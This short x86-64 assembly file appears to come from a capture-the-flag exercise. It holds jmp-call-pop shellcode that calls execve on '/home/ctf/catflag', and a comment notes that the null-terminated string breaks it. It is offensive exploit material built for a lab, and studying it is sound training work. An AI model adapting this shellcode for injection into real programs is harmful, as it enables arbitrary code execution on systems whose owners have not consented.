; this shellcode won't work because .string is null terminated
.global _start
_start:
.intel_syntax noprefix
    jmp call_shellcode
shellcode:
.intel_syntax noprefix
    pop rdi
    xor eax, eax
    add eax, 0x3b
    xor esi, esi
    xor edx, edx
    syscall
call_shellcode:
    call shellcode
    .string "/home/ctf/catflag"